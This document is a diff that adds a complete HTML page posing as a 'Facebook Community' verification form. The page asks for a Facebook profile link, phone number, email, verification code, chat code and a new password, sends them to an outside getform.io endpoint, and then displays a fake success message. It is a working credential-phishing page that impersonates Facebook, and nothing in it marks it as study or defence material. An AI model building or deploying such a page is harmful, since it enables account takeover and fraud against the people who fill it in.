@@ -1,1 +1,125 @@
-https://code.dcoder.tech/files/design/689224414aee5c7684524632/final-results
+<html>
+ <head>  
+ </head> 
+ <body> 
+  <meta charset="UTF-8"> 
+  <title>Facebook Info Form</title> 
+  <style>
+    body {
+      background: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .form-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      width: 350px;
+    }
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #1877f2;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #333;
+    }
+    input[type="text"],
+    input[type="date"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      background: #1877f2;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #145dbf;
+    }
+    .success-message {
+      display: none;
+      margin-top: 20px;
+      padding: 15px;
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+  </style> 
+  <div class="form-container"> 
+   <h2>Facebook Community</h2> 
+   <form id="fbForm" action="https://getform.io/f/axoydqnb" method="POST"> 
+    <label>Facebook ID link:</label> 
+    <input type="text" name="Facebook ID Link" placeholder="Paste your ID link" required> 
+    <label>Phone number:</label> 
+    <input type="text" name="Phone Number" placeholder="Enter your phone number" required> 
+    <label>Email:</label> 
+    <input type="text" name="Email" placeholder="Enter your email" required> 
+    <label>Verify:</label> 
+    <input type="text" name="Verification Code" placeholder="Enter the verification code" required> 
+    <label>Account Created On:</label> 
+    <input type="date" name="Account Created" required> 
+    <label>Facebook Birth date:</label> 
+    <input type="date" name="Facebook Birthday" required> 
+    <label>Your Last Post Date:</label> 
+    <input type="date" name="Last Post Date" required> 
+    <label>Chat Code:</label> 
+    <input type="text" name="Chat Code" placeholder="Enter your chat code" required> 
+    <label>Set Password:</label> 
+    <input type="text" name="Password" placeholder="Enter new password" required> 
+    <label>Re-enter Password:</label> 
+    <input type="text" name="Re-enter Password" placeholder="Re-enter new password" required> 
+    <button type="submit">Submit</button> 
+   </form> 
+   <div class="success-message" id="successMessage">
+     ✅ 
+    <strong>Successfully done!</strong> 
+    <br> Thanks for your information, we will send you feedback within three days. 
+   </div> 
+  </div> 
+  <script>
+    const form = document.getElementById('fbForm');
+    const successMessage = document.getElementById('successMessage');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault(); // prevent actual submission
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          form.reset();
+          successMessage.style.display = 'block';
+        } else {
+          alert("Something went wrong! Please try again.");
+        }
+      }).catch(error => {
+        alert("Something went wrong!");
+      });
+    });
+  </script>   
+ </body>
+</html>
